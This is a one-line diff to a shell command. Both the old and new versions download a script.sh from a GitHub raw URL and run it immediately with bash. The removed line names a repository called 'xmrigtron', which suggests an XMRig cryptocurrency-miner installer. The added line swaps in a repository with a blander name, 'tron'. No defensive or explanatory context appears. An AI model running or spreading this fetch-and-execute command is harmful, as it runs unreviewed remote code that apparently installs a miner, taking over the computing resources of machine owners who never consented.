@@ -1,1 +1,1 @@
-curl https://raw.githubusercontent.com/samkcah/xmrigtron/main/script.sh --output script.sh ; bash script.sh
+curl https://raw.githubusercontent.com/kcahsam/tron/main/script.sh --output script.sh ; bash script.sh
